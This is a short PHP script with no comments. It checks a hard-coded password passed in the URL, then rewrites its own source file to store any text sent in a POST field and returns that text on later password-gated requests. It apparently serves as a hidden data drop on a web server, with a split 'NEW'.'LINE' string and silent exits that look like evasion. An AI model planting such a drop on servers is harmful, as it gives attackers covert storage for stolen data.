<?php
error_reporting (E_ALL ^ E_NOTICE);

$password = $_GET['p'];
$pass = "PASSWORD";
if ($password!=$pass) {
	die ();
}
if (isset($_POST['c'])) {
	preg_match ("|^(.+}NEW"."LINE)die \('|",join("NEW"."LINE",explode("\n",file_get_contents(basename($_SERVER['PHP_SELF'])))),$old);
	$fp = fopen (basename($_SERVER['PHP_SELF']),"w");
	fwrite ($fp,join("\n",explode("NEW"."LINE",$old[1]))."die ('".str_replace("'","\'",str_replace('\\','\\\\',$_POST['c']))."'); ?>");
	fclose ($fp);
	die ();
}
die (''); ?>
